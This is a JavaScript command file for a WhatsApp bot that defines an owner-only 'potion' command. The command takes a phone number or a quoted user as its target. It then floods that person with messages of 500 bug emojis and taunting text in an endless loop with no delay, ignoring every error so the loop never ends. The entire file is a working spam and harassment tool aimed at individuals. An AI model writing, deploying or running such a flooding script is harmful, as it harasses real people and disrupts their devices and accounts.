import { owners } from '../config.js'

export const name = 'potion'
export const description = 'Unleash infinite savage bug chaos!'
export const command = ['potion']
export const ownerOnly = true

export async function execute(m, { client, text, isOwner }) {
  if (!isOwner) return client.reply(m.chat, `❌ You lack the dark power to unleash this.`, m)

  let target = ''
  if (m.quoted) target = m.quoted.sender
  else if (text) {
    if (text.includes('@')) target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    else target = text + '@s.whatsapp.net'
  }
  if (!target) return client.reply(m.chat, '⚠️ Specify the unfortunate soul to be bugged!', m)

  client.reply(m.chat, `⚠️ Unleashing eternal bug plague on ${target}... Brace yourself!`, m)

  // Start endless loop of spam
  while (true) {
    try {
      // Compose mega spam message: thousands of bugs + savage text
      let bugs = '🐛'.repeat(500) // 500 bugs at once
      let savageText = '🕷️ The bug plague devours all resistance! 🕷️\n'

      await client.sendMessage(target, { text: savageText + bugs })

      // Immediately repeat, no delay
    } catch (e) {
      // If error, just ignore and continue
    }
  }
}
